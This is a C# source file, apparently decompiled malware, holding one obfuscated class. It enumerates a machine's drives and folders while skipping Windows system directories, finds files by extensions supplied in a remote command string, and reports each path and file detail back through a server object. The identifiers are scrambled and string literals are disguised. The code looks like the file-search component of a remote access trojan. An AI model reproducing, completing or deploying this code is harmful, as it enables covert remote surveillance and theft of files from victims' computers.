using System;
using System.Collections.Generic;
using System.IO;

namespace uiltghnsra;

internal class DRUIVF
{
	public List<string> uiltghnsranotFilders = new List<string>();

	public string uiltghnsramainPiath;

	public int uiltghnsrasInrdx = 0;

	public List<string> uiltghnsrasFidles = new List<string>();

	public string uiltghnsrafilesLrougs = COUNF.uiltghnsrafilesLrougs;

	public int uiltghnsrafInrdx = 0;

	public bool uiltghnsrareagidng = false;

	public MCUDM iservder;

	public List<string> uiltghnsrafEdxts = new List<string>();

	public bool uiltghnsraseueAccdess(string fPath)
	{
		DirectoryInfo directoryInfo = new DirectoryInfo(fPath);
		try
		{
			directoryInfo.GetDirectories();
			return true;
		}
		catch (Exception)
		{
			return false;
		}
	}

	public DRUIVF()
	{
		uiltghnsranotFilders.Add("program files|uiltghnsra".Split(new char[1] { '|' })[0]);
		uiltghnsranotFilders.Add("system volume information|uiltghnsra".Split(new char[1] { '|' })[0]);
		uiltghnsranotFilders.Add("windows|uiltghnsra".Split(new char[1] { '|' })[0]);
		uiltghnsranotFilders.Add("program files (x86)|uiltghnsra".Split(new char[1] { '|' })[0]);
	}

	public IEnumerable<string> uiltghnsraadudFile(string path)
	{
		Queue<string> moreFiles = new Queue<string>();
		moreFiles.Enqueue(path);
		while (moreFiles.Count > 0 && !iservder.uiltghnsraautCdnls)
		{
			path = moreFiles.Dequeue();
			try
			{
				string[] directories = Directory.GetDirectories(path);
				foreach (string text in directories)
				{
					if (uiltghnsraseueAccdess(text) && !uiltghnsranotFilders.Contains(text.ToLower()))
					{
						moreFiles.Enqueue(text);
					}
				}
			}
			catch
			{
			}
			string[] files = Directory.GetFiles(path);
			if (files != null)
			{
				for (int i = 0; i < files.Length; i++)
				{
					yield return files[i];
				}
			}
		}
	}

	public void uiltghnsralouokFile(string tempStr)
	{
		iservder.uiltghnsraautCdnls = false;
		uiltghnsrafEdxts.Clear();
		uiltghnsrasFidles.Clear();
		uiltghnsrafInrdx = 0;
		uiltghnsrasInrdx = 0;
		string[] array = tempStr.Split(new char[1] { '<' });
		if (array.Length <= 1)
		{
			return;
		}
		string[] array2 = array[0].Split(new char[1] { '>' });
		string[] array3 = array2;
		foreach (string text in array3)
		{
			if (text != "")
			{
				uiltghnsrafEdxts.Add(text);
			}
		}
		if (array[1] != "")
		{
			uiltghnsrareagidng = true;
			uiltghnsraseundSearch(array[1]);
			uiltghnsrareagidng = false;
			iservder.uiltghnsrapuush_data(null, "uiltghnsra-seuard=seauhed|uiltghnsra".Split(new char[1] { '|' })[0]);
		}
	}

	public string uiltghnsrachueckFolder(string path)
	{
		string text = "";
		if (Directory.Exists(path))
		{
			string[] directories = Directory.GetDirectories(path);
			foreach (string text2 in directories)
			{
				if (uiltghnsraseueAccdess(text2))
				{
					text = text + text2 + ">|uiltghnsra".Split(new char[1] { '|' })[0];
				}
			}
		}
		return text;
	}

	public void uiltghnsraseundSearch(string path)
	{
		try
		{
			foreach (string item in uiltghnsraadudFile(path))
			{
				string extension = Path.GetExtension(item);
				if (uiltghnsrafEdxts.Contains(extension.ToLower()))
				{
					string text = iservder.uiltghnsrafiule_indfo(item, ret: true);
					iservder.uiltghnsrapuush_data(null, "uiltghnsra-seuarf=|uiltghnsra".Split(new char[1] { '|' })[0] + item + "<FIULE_AUUTO<|uiltghnsra".Split(new char[1] { '|' })[0] + text);
				}
				if (iservder.uiltghnsraautCdnls)
				{
					break;
				}
			}
		}
		catch
		{
		}
	}

	public string uiltghnsralouokupFile(string path)
	{
		string text = "";
		if (Directory.Exists(path))
		{
			string[] files = Directory.GetFiles(path);
			foreach (string text2 in files)
			{
				text = text + text2 + ">|uiltghnsra".Split(new char[1] { '|' })[0];
			}
		}
		return text;
	}

	public string uiltghnsralouokuprDrive()
	{
		string text = "";
		DriveInfo[] drives = DriveInfo.GetDrives();
		DriveInfo[] array = drives;
		foreach (DriveInfo driveInfo in array)
		{
			if (driveInfo.IsReady)
			{
				text = text + driveInfo.Name + ">|uiltghnsra".Split(new char[1] { '|' })[0];
			}
		}
		return text;
	}
}
